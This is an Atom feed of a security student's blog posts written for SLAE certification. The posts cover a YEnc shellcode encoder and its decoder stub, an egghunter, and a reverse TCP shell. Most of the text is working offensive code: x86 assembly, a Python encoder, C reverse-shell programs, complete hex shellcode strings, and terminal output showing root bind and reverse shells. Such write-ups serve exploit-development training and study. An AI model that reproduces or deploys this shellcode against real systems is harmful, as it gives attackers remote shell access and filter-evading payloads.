<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Slae | tcunha.github.io]]></title>
  <link href="http://tcunha.github.io/blog/categories/slae/atom.xml" rel="self"/>
  <link href="http://tcunha.github.io/"/>
  <updated>2018-07-14T09:26:17+00:00</updated>
  <id>http://tcunha.github.io/</id>
  <author>
    <name><![CDATA[tcunha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SLAE 0x04: Encoder]]></title>
    <link href="http://tcunha.github.io/blog/2018/07/12/slae-0x04-encoder/"/>
    <updated>2018-07-12T20:57:49+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/07/12/slae-0x04-encoder</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>This one details the use of an encoding scheme to encode the shellcode with and decode it subsequently on runtime.</p>

<p>I&rsquo;ve decided to use <a href="http://www.yenc.org/yenc-draft.1.3.txt">YEnc</a> (draft 1.3). YEnc is used to encode binary data to be transmitted by email or newsgroups and uses the complete 8-bit character set, thus making its output only 1-2% larger than the original.</p>

<p>Basically, the encoding process consists of for any given character, increment its ASCII value by 42, modulo 256. Next, if the resulting character is a forbidden one (0x00, 0x0a, 0x0d and 0x3d), output the escape 0x3d character and increment the previous resulting character by 64, modulo 256.</p>

<p>The encoder does not strictly follow the draft, since it will not use the header, trailer and the CRC32 checksum.</p>

<pre><code class="python">#!/usr/bin/python

# Follows YEnc draft 1.3 with regards to the encoding process. No header or
# trailer will be used by the decoder, nor will the CRC32.
#
# An encoded character is equal to its original ASCII value plus 42, modulo 256.
# In case of a special character is detected (0x00, 0x0a, 0x0d and 0x3d), the
# resulting encoded character is prefixed with the escape 0x3d character and its
# already encoded result (with the above) will be incremented 64, modulo 256.

import sys

if len(sys.argv) == 1:
    sys.exit("usage: opcodes")
print "Original shellcode size: " + str(len(sys.argv[1]))

enc = list()
for c in sys.argv[1]:
    c = (ord(c) + 42) % 256
    if c == 0x00 or c == 0x0a or c == 0x0d or c == 0x3d:
        enc.append(hex(61))
        c = (c + 64) % 256                  # critical character; double encode
    enc.append(hex(c))                      # regular character

print "Encoded shellcode size: " + str(len(enc))
print ",".join(enc)
</code></pre>

<pre><code class="bash encoder in action">$ opcodes=`asm-opcodes ../0x01-bind/bind`; ./encoder.py `echo -e $opcodes`
Original shellcode size: 82
Encoded shellcode size: 83
0x5b,0xea,0x5b,0x20,0xc3,0x90,0xe2,0x91,0x2b,0x94,0x2c,0x85,0x94,0x2b,0x83,0xf7,0xaa,0xbd,0x90,0xe2,0x93,0x2b,0x80,0x90,0x92,0x3a,0xbc,0x90,0x94,0x2c,0xb3,0xb,0x94,0x3a,0x84,0xf7,0xaa,0x90,0xe2,0x95,0x2b,0x5b,0xf3,0xf7,0xaa,0x21,0xb,0x90,0xe2,0x96,0x2b,0xf7,0xaa,0xbd,0x6b,0x6b,0x94,0x69,0x82,0xf7,0xaa,0x73,0xa3,0x22,0x7a,0xda,0x35,0x92,0x98,0x59,0x9d,0x92,0x92,0x59,0x59,0x8c,0x93,0xb3,0x3d,0x4d,0x6b,0xf7,0xaa
</code></pre>

<p>The resulting shellcode is using the FPU <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="(https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the shellcode. Due to the decoding process having to discard the escape characters, it is also pushing the final decoded characters to the stack instead of the data section, where it would imply having to overwrite the escape characters:</p>

<pre><code class="asm">global _start

section .text
_start:
    xor ecx, ecx
    mul ecx                         ; make eax and edx zero, as well

    fldz                            ; retrieve shellcode address via fldz
    jmp decoder_pc

    ; the shellcode address is 4 bytes below of fldz
    decoder_shellcode: db SHELLCODE
    ; get the shellcode length by using the $ identifier (which evaluates to
    ; the current address)
    decoder_length: equ $ - decoder_shellcode

decoder_pc:
    ; the FPU structure in memory contains the address of the last FPU
    ; instruction on byte 0xc (the previous 3 bytes are composed of the
    ; control, status and tag word)
    fstenv [esp - 0xc]
    pop eax
    lea esi, [eax + 0x4]            ; the shellcode is 4 bytes below

    mov cl, decoder_length
decoder_loop:
    cmp byte [esi], 0x3d            ; check if it is a regular character
    jnz decoder_regular             ; not an escaped character

    inc esi                         ; grab the next character, instead
    sub byte [esi], 0x40            ; per the draft, subtract 0x40
    dec ecx                         ; the escape character was skipped
decoder_regular:
    sub byte [esi], 0x2a            ; per the draft, subtract 0x2a
    mov al, [esi]                   ; can't mov m8, m8
    mov [esp], al                   ; move decoded character to the stack
    inc esi                         ; go to the next character
    inc esp                         ; increase stack for the next one
    inc edx                         ; save number of copied characters
    loop decoder_loop

    ; before jumping to the stack, its pointer needs to be adjusted by the
    ; number of copied characters; besides this also avoids the shellcode
    ; potentially overwriting itself with push instructions
    sub esp, edx
    jmp esp                         ; finally jump to the shellcode
</code></pre>

<p>As usual, the configure script in the base directory can be used to tweak the code. In this case, the new -s command-line option should point to the shellcode to encode:</p>

<pre><code class="bash">$ ./configure -s 0x02-reverse/reverse
Using listening port: 0x9210
Using remote host: 0x0101017f
Using remote port: 0x9210
Using shellcode: 0x02-reverse/reverse
$ ./configure
Using listening port: 0x9210
Using remote host: 0x0101017f
Using remote port: 0x9210
Using shellcode: 0x01-bind/bind
$ cd 0x04-encoder/
$ make
nasm  -f elf32 -o decoder.o decoder.asm
ld -N -zexecstack -o decoder decoder.o
08048080 &lt;_start&gt;:
 8048080:       31 c9                   xor    ecx,ecx
 8048082:       f7 e1                   mul    ecx
 8048084:       d9 ee                   fldz
 8048086:       eb 53                   jmp    80480db &lt;decoder_pc&gt;

08048088 &lt;decoder_shellcode&gt;:
 8048088:       5b                      pop    ebx
 8048089:       ea 5b 20 c3 90 e2 91    jmp    0x91e2:0x90c3205b
 8048090:       2b 94 2c 85 94 2b 83    sub    edx,DWORD PTR [esp+ebp*1-0x7cd46b7b]
 8048097:       f7 aa bd 90 e2 93       imul   DWORD PTR [edx-0x6c1d6f43]
 804809d:       2b 80 90 92 3a bc       sub    eax,DWORD PTR [eax-0x43c56d70]
 80480a3:       90                      nop
 80480a4:       94                      xchg   esp,eax
 80480a5:       2c b3                   sub    al,0xb3
 80480a7:       0b 94 3a 84 f7 aa 90    or     edx,DWORD PTR [edx+edi*1-0x6f55087c]
 80480ae:       e2 95                   loop   8048045 &lt;decoder_length+0x8047ff2&gt;
 80480b0:       2b 5b f3                sub    ebx,DWORD PTR [ebx-0xd]
 80480b3:       f7 aa 21 0b 90 e2       imul   DWORD PTR [edx-0x1d6ff4df]
 80480b9:       96                      xchg   esi,eax
 80480ba:       2b f7                   sub    esi,edi
 80480bc:       aa                      stos   BYTE PTR es:[edi],al
 80480bd:       bd 6b 6b 94 69          mov    ebp,0x69946b6b
 80480c2:       82 f7 aa                xor    bh,0xaa
 80480c5:       73 a3                   jae    804806a &lt;decoder_length+0x8048017&gt;
 80480c7:       22 7a da                and    bh,BYTE PTR [edx-0x26]
 80480ca:       35 92 98 59 9d          xor    eax,0x9d599892
 80480cf:       92                      xchg   edx,eax
 80480d0:       92                      xchg   edx,eax
 80480d1:       59                      pop    ecx
 80480d2:       59                      pop    ecx
 80480d3:       8c 93 b3 3d 4d 6b       mov    WORD PTR [ebx+0x6b4d3db3],ss
 80480d9:       f7                      .byte 0xf7
 80480da:       aa                      stos   BYTE PTR es:[edi],al

080480db &lt;decoder_pc&gt;:
 80480db:       9b d9 74 24 f4          fstenv [esp-0xc]
 80480e0:       58                      pop    eax
 80480e1:       8d 70 04                lea    esi,[eax+0x4]
 80480e4:       b1 53                   mov    cl,0x53

080480e6 &lt;decoder_loop&gt;:
 80480e6:       80 3e 3d                cmp    BYTE PTR [esi],0x3d
 80480e9:       75 05                   jne    80480f0 &lt;decoder_regular&gt;
 80480eb:       46                      inc    esi
 80480ec:       80 2e 40                sub    BYTE PTR [esi],0x40
 80480ef:       49                      dec    ecx

080480f0 &lt;decoder_regular&gt;:
 80480f0:       80 2e 2a                sub    BYTE PTR [esi],0x2a
 80480f3:       8a 06                   mov    al,BYTE PTR [esi]
 80480f5:       88 04 24                mov    BYTE PTR [esp],al
 80480f8:       46                      inc    esi
 80480f9:       44                      inc    esp
 80480fa:       42                      inc    edx
 80480fb:       e2 e9                   loop   80480e6 &lt;decoder_loop&gt;
 80480fd:       29 d4                   sub    esp,edx
 80480ff:       ff e4                   jmp    esp
Shellcode size: 129
\x31\xc9\xf7\xe1\xd9\xee\xeb\x53\x5b\xea\x5b\x20\xc3\x90\xe2\x91\x2b\x94\x2c\x85\x94\x2b\x83\xf7\xaa\xbd\x90\xe2\x93\x2b\x80\x90\x92\x3a\xbc\x90\x94\x2c\xb3\x0b\x94\x3a\x84\xf7\xaa\x90\xe2\x95\x2b\x5b\xf3\xf7\xaa\x21\x0b\x90\xe2\x96\x2b\xf7\xaa\xbd\x6b\x6b\x94\x69\x82\xf7\xaa\x73\xa3\x22\x7a\xda\x35\x92\x98\x59\x9d\x92\x92\x59\x59\x8c\x93\xb3\x3d\x4d\x6b\xf7\xaa\x9b\xd9\x74\x24\xf4\x58\x8d\x70\x04\xb1\x53\x80\x3e\x3d\x75\x05\x46\x80\x2e\x40\x49\x80\x2e\x2a\x8a\x06\x88\x04\x24\x46\x44\x42\xe2\xe9\x29\xd4\xff\xe4
cc -DSHELLCODE=`asm-opcodes decoder` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</code></pre>

<p>Debugging with gdb(1) shows that the absolute address of the shellcode is correctly retrieved, since the address of the last FPU instruction is 0x08048084, thus putting the encoded shellcode 4 bytes below in 0x08048088:</p>

<pre><code class="bash debugging with gdb(1)">$ gdb -q decoder
Reading symbols from decoder...(no debugging symbols found)...done.
(gdb) b _start
Breakpoint 1 at 0x8048080
(gdb) r
Starting program: /attic/slae/exam/0x04-encoder/decoder
Dump of assembler code for function _start:
=&gt; 0x08048080 &lt;+0&gt;:     xor    ecx,ecx
   0x08048082 &lt;+2&gt;:     mul    ecx
   0x08048084 &lt;+4&gt;:     fldz
   0x08048086 &lt;+6&gt;:     jmp    0x80480db &lt;decoder_pc&gt;
End of assembler dump.
$1 = [ IF ]

Breakpoint 1, 0x08048080 in _start ()
(gdb) disass decoder_pc
Dump of assembler code for function decoder_pc:
   0x080480db &lt;+0&gt;:     fstenv [esp-0xc]
   0x080480e0 &lt;+5&gt;:     pop    eax
   0x080480e1 &lt;+6&gt;:     lea    esi,[eax+0x4]
   0x080480e4 &lt;+9&gt;:     mov    cl,0x53
End of assembler dump.
(gdb) b *decoder_pc+6
Breakpoint 2 at 0x80480e1
(gdb) continue
Continuing.
Dump of assembler code for function decoder_pc:
   0x080480db &lt;+0&gt;:     fstenv [esp-0xc]
   0x080480e0 &lt;+5&gt;:     pop    eax
=&gt; 0x080480e1 &lt;+6&gt;:     lea    esi,[eax+0x4]
   0x080480e4 &lt;+9&gt;:     mov    cl,0x53
End of assembler dump.
$2 = [ PF IF ]

Breakpoint 2, 0x080480e1 in decoder_pc ()
(gdb) i r eax
eax            0x8048084        134512772
(gdb) x/i $eax
   0x8048084 &lt;_start+4&gt;:        fldz
(gdb) x/4x decoder_shellcode
0x8048088 &lt;decoder_shellcode&gt;:  0x205bea5b      0x91e290c3      0x852c942b      0xf7832b94
(gdb) x/4x $eax+4
0x8048088 &lt;decoder_shellcode&gt;:  0x205bea5b      0x91e290c3      0x852c942b      0xf7832b94
(gdb) disass decoder_regular
Dump of assembler code for function decoder_regular:
   0x080480f0 &lt;+0&gt;:     sub    BYTE PTR [esi],0x2a
   0x080480f3 &lt;+3&gt;:     mov    al,BYTE PTR [esi]
   0x080480f5 &lt;+5&gt;:     mov    BYTE PTR [esp],al
   0x080480f8 &lt;+8&gt;:     inc    esi
   0x080480f9 &lt;+9&gt;:     inc    esp
   0x080480fa &lt;+10&gt;:    inc    edx
   0x080480fb &lt;+11&gt;:    loop   0x80480e6 &lt;decoder_loop&gt;
   0x080480fd &lt;+13&gt;:    sub    esp,edx
   0x080480ff &lt;+15&gt;:    jmp    esp
End of assembler dump.
(gdb) b *0x080480ff
Breakpoint 3 at 0x80480ff
(gdb) continue
Continuing.
Dump of assembler code for function decoder_regular:
   0x080480f0 &lt;+0&gt;:     sub    BYTE PTR [esi],0x2a
   0x080480f3 &lt;+3&gt;:     mov    al,BYTE PTR [esi]
   0x080480f5 &lt;+5&gt;:     mov    BYTE PTR [esp],al
   0x080480f8 &lt;+8&gt;:     inc    esi
   0x080480f9 &lt;+9&gt;:     inc    esp
   0x080480fa &lt;+10&gt;:    inc    edx
   0x080480fb &lt;+11&gt;:    loop   0x80480e6 &lt;decoder_loop&gt;
   0x080480fd &lt;+13&gt;:    sub    esp,edx
=&gt; 0x080480ff &lt;+15&gt;:    jmp    esp
End of assembler dump.
$3 = [ PF SF IF ]

Breakpoint 3, 0x080480ff in decoder_regular ()
(gdb) x/10i $esp
   0xbffff714:  xor    eax,eax
   0xbffff716:  xor    esi,esi
   0xbffff718:  cdq
   0xbffff719:  mov    ax,0x167
   0xbffff71d:  push   0x2
   0xbffff71f:  pop    ebx
   0xbffff720:  push   0x1
   0xbffff722:  pop    ecx
   0xbffff723:  int    0x80
   0xbffff725:  xchg   ebx,eax
</code></pre>

<p>Given the above, the shellcode is being correctly decoded on the stack. Executing it yields a bind shell:</p>

<pre><code class="bash executing the shellcode"># ./shellcode
Shellcode length: 129
$ ss -nlt|grep 4242
LISTEN     0      0            *:4242                     *:*
$ nc -v 127.0.0.1 4242
Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x03: Egghunter]]></title>
    <link href="http://tcunha.github.io/blog/2018/06/19/slae-0x03-egghunter/"/>
    <updated>2018-06-19T23:56:39+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/06/19/slae-0x03-egghunter</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>This exercise consisted in using the egghunter technique, which is rather useful when a shellcode is bigger than the available space. On those circumstances, an egg can be planted right before the second stage shellcode which when found by the hunter will be executed.</p>

<p>There is an interesting resource by <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">skape</a> which explains this concept quite well, as well as, various Linux implementations.</p>

<p>The one I came up with is based on his revisited <a href="http://man7.org/linux/man-pages/man2/access.2.html">access(2)</a> system call with some differences. I&rsquo;ve decided to instead use the <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call and to start on the very first page of the process virtual address space. Even though Linux reserves the first few pages for performance reasons and prevents a process of allocating them to avoid potential security issues related to NULL pointer dereferences on page zero, not starting the search at 0x10000 (see <a href="https://www.kernel.org/doc/Documentation/sysctl/vm.txt">vm.mmap_min_addr</a>) allows shaving off a few bytes.</p>

<p>The <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call will check if the provided address is valid. If for any reason the address can&rsquo;t be accessed (unmapped, invalid permissions, etc), then EFAULT (-14) is returned, which the egghunter should check for robustness. In that case, the next page (PAGE_SIZE) is tried until addressable memory is found.</p>

<pre><code class="bash retrieving the error code">$ asm-errno EFAULT
14
0xfffffffffffffff2
</code></pre>

<pre><code class="c rmdir(2) prototype">int rmdir(const char *pathname);
</code></pre>

<pre><code class="bash retrieving the system call number and size of page">$ asm-syscall rmdir
#define __NR_rmdir 40
0x28
$ getconf PAGE_SIZE
4096
</code></pre>

<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 40                 |
| ebx      | address to search  |
+----------+--------------------+
</code></pre>

<p>To avoid repeating the egg twice and save space, the non-executable egg is also calculated on the fly by incrementing its value.</p>

<p>String comparison is done with the scas family, which depending on the direction flag (DF) being set or not it automatically increments or decrements the pointer to the next character. To illustrate this, consider the following program where a string is printed to the screen character by character. This is using the <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the string to print:</p>

<pre><code class="asm">global _start

section .text
direction_print:
    pushad

    mov al, 0x4
    ; ssize_t write(int, const void *, size_t)
    mov bl, 0x1             ; fd
    lea ecx, [esp + 0x1c]   ; buf
    mov dl, 0x1             ; count
    int 0x80

    popad
    ret

_start:
    cld                     ; clear direction flag

    fldz                    ; retrieve the string address via fstenv
    jmp direction_pc

    ; the string is 4 bytes below of fdlz
    str: db "this is a string", 0xa

direction_loop:
    lodsb
    call direction_print
    loop direction_loop

    mov al, 0x1
    ; void exit(int)
    int 0x80

direction_pc:
    ; the FPU structure in memory contains the address of the last FPU
    ; instruction on byte 0xc (the previous 3 bytes are composed of the
    ; control, status and tag word)
    fstenv [esp - 0xc]
    pop ecx

    lea esi, [ecx + 0x4]    ; string is 4 bytes below
    push 0x11               ; string length
    pop ecx

    jmp direction_loop
</code></pre>

<pre><code class="bash">$ asm-compile direction-off.asm
$ asm-opcodes direction-off
Shellcode size: 63
\x60\xb0\x04\xb3\x01\x8d\x4c\x24\x1c\xb2\x01\xcd\x80\x61\xc3\xfc\xd9\xee\xeb\x1d\x74\x68\x69\x73\x20\x69\x73\x20\x61\x20\x73\x74\x72\x69\x6e\x67\x0a\xac\xe8\xd5\xff\xff\xff\xe2\xf8\xb0\x01\xcd\x80\x9b\xd9\x74\x24\xf4\x59\x8d\x71\x04\x6a\x11\x59\xeb\xe6
$ ./direction-off
this is a string
</code></pre>

<p>Below, the direction flag (DF) is being set, resulting in the string being printed backwards as expected:</p>

<pre><code class="diff">$ diff -u direction-off.asm direction-on.asm
--- direction-off.asm   2018-06-24 17:20:35.044465700 +0100
+++ direction-on.asm    2018-06-24 18:54:48.168812600 +0100
@@ -15,7 +15,7 @@
        ret

 _start:
-       cld                     ; clear direction flag
+       std                     ; set direction flag

        fldz                    ; retrieve the string address via fstenv
        jmp direction_pc
@@ -39,7 +39,7 @@
        fstenv [esp - 0xc]
        pop ecx

-       lea esi, [ecx + 0x4]    ; string is 4 bytes below
+       lea esi, [ecx + 0x4 + 0x11 - 1] ; string is 4 bytes below
        push 0x11               ; string length
        pop ecx
</code></pre>

<pre><code class="bash">$ asm-compile direction-on.asm
$ ./direction-on

gnirts a si siht$
</code></pre>

<p>Given all of the above, the resulting egghunter shellcode is:</p>

<pre><code class="asm">global _start

section .text
_start:
    cld                     ; clear direction flag for scasd
    xor ebx, ebx

egg_restart:
    push 0x28
    ; int rmdir(const char *)
    pop eax
    ; increment ebx to either align a page or check the next address
    inc ebx                 ; pathname
    int 0x80

    cmp al, 0xf2            ; check for a page fault on the lower bits only
    jnz egg_check           ; it's a valid page

    or bx, 0xfff            ; not an addressable page
    jmp egg_restart         ; check the next page (0xfff + 1 = PAGE_SIZE)

egg_check:
    mov eax, 0xcafebabd     ; add initial not static egg value
    inc eax                 ; increment the value to decrease the size
    mov edi, ebx            ; compare eax with edi
    scasd                   ; edi is incremented since the direction flag is zero
    jnz egg_restart         ; egg not found, try the next address

    jmp edi                 ; edi points to the shellcode to execute
</code></pre>

<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the STAGE2 variable:</p>

<pre><code class="bash">$ ./configure
Using listening port: 0x9210
Using remote host: 0x0101017f
Using remote port: 0x9210
$ cd 0x03-egghunter/
$ STAGE2=../0x02-reverse/reverse make
nasm  -f elf32 -o egghunter.o egghunter.asm
ld -N -zexecstack -o egghunter egghunter.o
08048060 &lt;_start&gt;:
 8048060:       fc                      cld
 8048061:       31 db                   xor    ebx,ebx

08048063 &lt;egg_restart&gt;:
 8048063:       6a 28                   push   0x28
 8048065:       58                      pop    eax
 8048066:       43                      inc    ebx
 8048067:       cd 80                   int    0x80
 8048069:       3c f2                   cmp    al,0xf2
 804806b:       75 07                   jne    8048074 &lt;egg_check&gt;
 804806d:       66 81 cb ff 0f          or     bx,0xfff
 8048072:       eb ef                   jmp    8048063 &lt;egg_restart&gt;

08048074 &lt;egg_check&gt;:
 8048074:       b8 bd ba fe ca          mov    eax,0xcafebabd
 8048079:       40                      inc    eax
 804807a:       89 df                   mov    edi,ebx
 804807c:       af                      scas   eax,DWORD PTR es:[edi]
 804807d:       75 e4                   jne    8048063 &lt;egg_restart&gt;
 804807f:       ff e7                   jmp    edi
Shellcode size: 33
\xfc\x31\xdb\x6a\x28\x58\x43\xcd\x80\x3c\xf2\x75\x07\x66\x81\xcb\xff\x0f\xeb\xef\xb8\xbd\xba\xfe\xca\x40\x89\xdf\xaf\x75\xe4\xff\xe7
cc -DEGGHUNTER=`asm-opcodes egghunter` -DSHELLCODE=`asm-opcodes ../0x02-reverse/reverse` -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
</code></pre>

<pre><code class="bash">$ nc -lv 127.1.1.1 4242
Listening on [127.1.1.1] (family 0, port 4242)
Connection from localhost 51918 received!
id
uid=0(root) gid=0(root) groups=0(root)
# ./shellcode
Egghunter length: 33
Shellcode length: 74
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x02: Reverse TCP Shell]]></title>
    <link href="http://tcunha.github.io/blog/2018/05/21/slae-0x02-reverse-tcp-shell/"/>
    <updated>2018-05-21T20:39:57+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/05/21/slae-0x02-reverse-tcp-shell</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>

<pre><code class="c connect(2) prototype">int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
</code></pre>

<p>Just like <a href="http://man7.org/linux/man-pages/man2/bind.2.html">bind(2)</a>, the second argument has to be manually packed with the IP address and port to connect to:</p>

<pre><code class="bash retrieving the system call number and constants">$ asm-syscall connect
#define __NR_connect 362
0x16a
$ python -c 'import socket; print socket.AF_INET'
2
</code></pre>

<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 362                |      +---------------------------------+ H
| ebx      | socket(2) fd       |      | IP address (network byte order) |
| ecx      | esp pointer        +--&gt;&gt;--+ port (network byte order)       |
| edx      | 16                 |      | AF_INET (2)                     |
+----------+--------------------+      +---------------------------------+ L
</code></pre>

<pre><code class="c">#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;

#include &lt;arpa/inet.h&gt;

#include &lt;err.h&gt;
#include &lt;errno.h&gt;
#include &lt;limits.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;strings.h&gt;
#include &lt;unistd.h&gt;

int
main(int argc, char **argv)
{
    char                    *exec_argv[] = { "/bin/sh", NULL };
    char                    *endptr;
    int                      fd;
    long                     port;
    struct sockaddr_in       sa;

    if (argc == 1)
        errx(1, "usage: host port");

    errno = 0;
    port = strtol(argv[2], &amp;endptr, 10);
    if (*endptr != '\0')
        errx(1, "not a number");
    if (errno == ERANGE || (port &lt;= 1024 || port &gt;= 65536))
        errx(1, "port out of range");

    if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
        err(1, "socket");

    bzero(&amp;sa, sizeof sa);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(argv[1]);
    sa.sin_port = htons(port);

    if (connect(fd, (struct sockaddr *) &amp;sa, sizeof sa) == -1)
        err(1, "connect");

    if (dup2(fd, STDIN_FILENO) == -1)
        err(1, "dup2");
    if (dup2(fd, STDOUT_FILENO) == -1)
        err(1, "dup2");
    if (dup2(fd, STDERR_FILENO) == -1)
        err(1, "dup2");

    execve(exec_argv[0], exec_argv, NULL);
    err(1, "execve");

    return (0); /* NOTREACHED */
}
</code></pre>

<p>Again, one should just use <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">getaddrinfo(3)</a> instead. This has the advantage of also being protocol agnostic:</p>

<pre><code class="c">#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;

#include &lt;err.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

int
reverse_try(struct addrinfo *p)
{
    int fd;

    if ((fd = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol)) == -1) {
        warn("socket");
        return (-1);
    }
    if (connect(fd, p-&gt;ai_addr, p-&gt;ai_addrlen) == -1) {
        close(fd);
        warn("connect");
        return (-1);
    }

    return (fd);
}

int
main(int argc, char **argv)
{
    char            *exec_args[] = { "/bin/sh", NULL };
    int              ai_ret, fd;
    struct addrinfo  ai_hints;
    struct addrinfo *ai_ptr, *ai_srv;

    if (argc != 3)
        errx(1, "usage: host port");

    memset(&amp;ai_hints, 0, sizeof ai_hints);
    ai_hints.ai_family = AF_UNSPEC;
    ai_hints.ai_socktype = SOCK_STREAM;

    if ((ai_ret = getaddrinfo(argv[1], argv[2], &amp;ai_hints, &amp;ai_srv)) == -1)
        errx(1, "getaddrinfo: %s", gai_strerror(ai_ret));
    for (ai_ptr = ai_srv; ai_ptr != NULL; ai_ptr = ai_ptr-&gt;ai_next) {
        if ((fd = reverse_try(ai_ptr)) != -1)
            break;
    }
    if (ai_ptr == NULL)
        errx(1, "failed to connect");
    freeaddrinfo(ai_srv);

    if (dup2(fd, STDIN_FILENO) == -1)
        err(1, "dup2");
    if (dup2(fd, STDOUT_FILENO) == -1)
        err(1, "dup2");
    if (dup2(fd, STDERR_FILENO) == -1)
        err(1, "dup2");

    execve(exec_args[0], exec_args, NULL);
    err(1, "execve");

    return (0); /* NOTREACHED */
}
</code></pre>

<p>As for the commented shellcode:</p>

<pre><code class="asm">global _start

section .text
_start:
    xor eax, eax
    cdq                     ; set edx to zero as well, by sign extending eax

    mov ax, 0x167           ; use mov instead of push imm16 and pop r16
    ; int socket(int, int, int)
    push 0x2                ; PF_INET
    pop ebx                 ; domain
    push 0x1                ; SOCK_STREAM
    pop ecx                 ; type
    ; edx (protocol) initialized to zero by the cdq instruction above
    int 0x80

    xchg ebx, eax           ; fd on ebx from this point below
    mov ax, 0x16a           ; use mov instead of push imm16 and pop r16
    ; int connect(int, const struct sockaddr *, socklen_t)
    push HOST               ; host in network byte order
    push word PORT          ; port in network byte order
    push word 0x2           ; AF_INET
    mov ecx, esp            ; addr
    push 0x10               ; 16 bytes in total
    pop edx                 ; addrlen
    int 0x80

    push 0x2
    pop ecx                 ; newfd
bind_dup2_loop:
    push 0x3f
    ; int dup2(int, int)
    pop eax 
    int 0x80
    dec ecx
    jns bind_dup2_loop      ; don't jump if ecx is positive

    cdq                     ; eax is zero from the dup2(2) above (stdin fd)
    push eax                ; to null terminate the filename
    push 0xb
    ; int execve(const char *, char *const [], char *const [])
    pop eax
    push 0x68732f6e         ; n/sh
    push 0x69622f2f         ; //bi
    mov ebx, esp            ; filename
    inc ecx                 ; ecx (argv) is 0xffffffff from the above dup(2)
    ; edx is already zero
    int 0x80
</code></pre>

<p>To define the remote host and port, like with the bind shell, the configure script should be used with the -h (127.1.1.1 by default) and -r (4242/tcp by default) command-line options:</p>

<pre><code class="bash">$ ./configure -h 127.2.2.2 -r 1337
Using remote host: 0x0202027f
Using listening port: 0x9210
Using remote port: 0x3905
$ ./configure -h 127.0.0.1 -r 1337
Host contains NUL bytes!
$ ./configure -h 127.3.3.3 -r 1280
Port contains NUL bytes!
$ ./configure
Using remote host: 0x0101017f
Using listening port: 0x9210
Using remote port: 0x9210
$ cd 0x02-reverse/
$ make
nasm  -f elf32 -o reverse.o reverse.asm
ld -N -zexecstack -o reverse reverse.o
08048060 &lt;_start&gt;:
 8048060:       31 c0                   xor    eax,eax
 8048062:       99                      cdq
 8048063:       66 b8 67 01             mov    ax,0x167
 8048067:       6a 02                   push   0x2
 8048069:       5b                      pop    ebx
 804806a:       6a 01                   push   0x1
 804806c:       59                      pop    ecx
 804806d:       cd 80                   int    0x80
 804806f:       93                      xchg   ebx,eax
 8048070:       66 b8 6a 01             mov    ax,0x16a
 8048074:       68 7f 01 01 01          push   0x101017f
 8048079:       66 68 10 92             pushw  0x9210
 804807d:       66 6a 02                pushw  0x2
 8048080:       89 e1                   mov    ecx,esp
 8048082:       6a 10                   push   0x10
 8048084:       5a                      pop    edx
 8048085:       cd 80                   int    0x80
 8048087:       6a 02                   push   0x2
 8048089:       59                      pop    ecx

0804808a &lt;bind_dup2_loop&gt;:
 804808a:       6a 3f                   push   0x3f
 804808c:       58                      pop    eax
 804808d:       cd 80                   int    0x80
 804808f:       49                      dec    ecx
 8048090:       79 f8                   jns    804808a &lt;bind_dup2_loop&gt;
 8048092:       99                      cdq
 8048093:       50                      push   eax
 8048094:       6a 0b                   push   0xb
 8048096:       58                      pop    eax
 8048097:       68 6e 2f 73 68          push   0x68732f6e
 804809c:       68 2f 2f 62 69          push   0x69622f2f
 80480a1:       89 e3                   mov    ebx,esp
 80480a3:       41                      inc    ecx
 80480a4:       cd 80                   int    0x80
Shellcode size: 70
